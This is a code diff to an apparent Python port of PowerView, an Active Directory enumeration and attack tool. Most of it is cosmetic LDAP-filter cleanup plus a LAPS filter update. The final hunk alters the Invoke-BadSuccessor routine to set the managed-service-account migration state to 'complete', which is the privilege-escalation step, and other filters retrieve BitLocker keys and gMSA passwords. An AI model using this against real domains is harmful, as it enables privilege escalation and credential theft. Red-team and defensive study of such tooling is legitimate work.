@@ -411,6 +411,8 @@ class PowerView:
 			func_params = func_signature.parameters
 			func_args = {k: v for k, v in vars(args).items() if k in func_params}
 			func_args['pv'] = self
+			if 'args' in func_params:
+				func_args['args'] = args
 			result = func(**func_args)
 		else:
 			method_name = module_name.replace('-', '_').lower()
@@ -1422,19 +1424,19 @@ class PowerView:
 		if args:
 			if hasattr(args, 'unconstrained') and args.unconstrained:
 				logging.debug("[Get-DomainComputer] Searching for computers with unconstrained delegation")
-				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=524288)'
+				ldap_filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
 			if hasattr(args, 'enabled') and args.enabled:
 				logging.debug("[Get-DomainComputer] Searching for enabled computer")
-				ldap_filter += f'(!(userAccountControl:1.2.840.113556.1.4.803:=2))'
+				ldap_filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=2))'
 			if hasattr(args, 'disabled') and args.disabled:
 				logging.debug("[Get-DomainComputer] Searching for disabled computer")
-				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=2)'
+				ldap_filter += '(userAccountControl:1.2.840.113556.1.4.803:=2)'
 			if hasattr(args, 'workstation') and args.workstation:
 				logging.debug("[Get-DomainComputer] Searching for workstation")
-				ldap_filter += f'(&(operatingSystem=*)(!(operatingSystem=*Server*)))'
+				ldap_filter += '(&(operatingSystem=*)(!(operatingSystem=*Server*)))'
 			if hasattr(args, 'notworkstation') and args.notworkstation:
 				logging.debug("[Get-DomainComputer] Searching for not workstation")
-				ldap_filter += f'(&(operatingSystem=*)(operatingSystem=*Server*))'
+				ldap_filter += '(&(operatingSystem=*)(operatingSystem=*Server*))'
 			if hasattr(args, 'obsolete') and args.obsolete:
 				logging.debug("[Get-DomainComputer] Searching for obsolete computer")
 				obsolete_os_patterns = ['2000', 'Windows XP', 'Windows Server 2003', 'Windows Server 2008', 'Windows 7', 'Windows 8', 'Windows Server 2012']
@@ -1444,47 +1446,48 @@ class PowerView:
 				properties.add('operatingSystemVersion')
 			if hasattr(args, 'trustedtoauth') and args.trustedtoauth:
 				logging.debug("[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals")
-				ldap_filter += f'(msds-allowedtodelegateto=*)'
+				ldap_filter += '(msds-allowedtodelegateto=*)'
 				properties.add('msds-AllowedToDelegateTo')
 			if hasattr(args, 'laps') and args.laps:
 				logging.debug("[Get-DomainComputer] Searching for computers with LAPS enabled")
-				ldap_filter += f'(ms-Mcs-AdmPwd=*)'
+				ldap_filter += '(|(ms-Mcs-AdmPwdExpirationTime=*)(msLaps-PasswordExpirationTime=*))'
 				properties.add('ms-Mcs-AdmPwd')
 				properties.add('ms-Mcs-AdmPwdExpirationTime')
+				properties.add('msLaps-PasswordExpirationTime')
 			if hasattr(args, 'rbcd') and args.rbcd:
 				logging.debug("[Get-DomainComputer] Searching for computers that are configured to allow resource-based constrained delegation")
-				ldap_filter += f'(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'
+				ldap_filter += '(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'
 				properties.add('msDS-AllowedToActOnBehalfOfOtherIdentity')
 			if hasattr(args, 'shadowcred') and args.shadowcred:
 				logging.debug("[Get-DomainComputer] Searching for computers that are configured to have msDS-KeyCredentialLink attribute set")
-				ldap_filter += f'(msDS-KeyCredentialLink=*)'
+				ldap_filter += '(msDS-KeyCredentialLink=*)'
 				properties.add('msDS-KeyCredentialLink')
 			if hasattr(args, 'printers') and args.printers:
 				logging.debug("[Get-DomainComputer] Searching for printers")
-				ldap_filter += f'(objectCategory=printQueue)'
+				ldap_filter += '(objectCategory=printQueue)'
 			if hasattr(args, 'spn') and args.spn:
 				logging.debug(f"[Get-DomainComputer] Searching for computers with SPN attribute: {args.spn}")
-				ldap_filter += f'(servicePrincipalName=*)'
+				ldap_filter += '(servicePrincipalName=*)'
 			if hasattr(args, 'excludedcs') and args.excludedcs:
 				logging.debug("[Get-DomainComputer] Excluding domain controllers")
-				ldap_filter += f'(!(userAccountControl:1.2.840.113556.1.4.803:=8192))'
+				ldap_filter += '(!(userAccountControl:1.2.840.113556.1.4.803:=8192))'
 			if hasattr(args, 'bitlocker') and args.bitlocker:
 				logging.debug("[Get-DomainComputer] Searching for computers with BitLocker keys")
-				ldap_filter += f'(objectClass=msFVE-RecoveryInformation)'
+				ldap_filter += '(objectClass=msFVE-RecoveryInformation)'
 				properties.add('msFVE-KeyPackage')
 				properties.add('msFVE-RecoveryGuid')
 				properties.add('msFVE-RecoveryPassword')
 				properties.add('msFVE-VolumeGuid')
 			if hasattr(args, 'gmsapassword') and args.gmsapassword:
 				logging.debug("[Get-DomainComputer] Searching for computers with GSMA password stored")
-				ldap_filter += f'(objectClass=msDS-GroupManagedServiceAccount)'
+				ldap_filter += '(objectClass=msDS-GroupManagedServiceAccount)'
 				properties.add('msDS-ManagedPassword')
 				properties.add('msDS-GroupMSAMembership')
 				properties.add('msDS-ManagedPasswordInterval')
 				properties.add('msDS-ManagedPasswordId')
 			if hasattr(args, 'pre2k') and args.pre2k:
 				logging.debug("[Get-DomainComputer] Search for Pre-Created Windows 2000 computer")
-				ldap_filter += f'(userAccountControl=4128)(logonCount=0)'
+				ldap_filter += '(userAccountControl=4128)(logonCount=0)'
 			if hasattr(args, 'ldapfilter') and args.ldapfilter:
 				logging.debug(f'[Get-DomainComputer] Using additional LDAP filter: {args.ldapfilter}')
 				ldap_filter += f"{args.ldapfilter}"
@@ -7344,11 +7347,11 @@ displayName=New Group Policy Object
 			target_objectclass = target.get('attributes', {}).get('objectClass')
 			if 'msDS-DelegatedManagedServiceAccount' in target_objectclass:
 				continue
-			succeeded = self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, [target_dn])], 'msDS-DelegatedMSAState': [(ldap3.MODIFY_REPLACE, [DMSA_DELEGATED_MSA_STATE.START_MIGRATION.value])]})
+			succeeded = self.ldap_session.modify(dmsa_dn, {'msDS-ManagedAccountPrecededByLink': [(ldap3.MODIFY_REPLACE, [target_dn])], 'msDS-DelegatedMSAState': [(ldap3.MODIFY_REPLACE, [DMSA_DELEGATED_MSA_STATE.COMPLETE_MIGRATION.value])]})
 			if not succeeded:
 				logging.warning(f"[Invoke-BadSuccessor] Failed to change msDS-ManagedAccountPrecededByLink to {target_san or target_dn}")
 			
-			succeeded = self.ldap_session.modify(target_dn, {'msDS-SupersededManagedAccountLink': [(ldap3.MODIFY_REPLACE, [dmsa_dn])], 'msDS-SupersededServiceAccountState': [(ldap3.MODIFY_REPLACE, [DMSA_DELEGATED_MSA_STATE.START_MIGRATION.value])]})
+			succeeded = self.ldap_session.modify(target_dn, {'msDS-SupersededManagedAccountLink': [(ldap3.MODIFY_REPLACE, [dmsa_dn])], 'msDS-SupersededServiceAccountState': [(ldap3.MODIFY_REPLACE, [DMSA_DELEGATED_MSA_STATE.COMPLETE_MIGRATION.value])]})
 			if not succeeded:
 				logging.warning(f"[Invoke-BadSuccessor] Failed to change msDS-SupersededManagedAccountLink to {dmsa_dn}")
 			
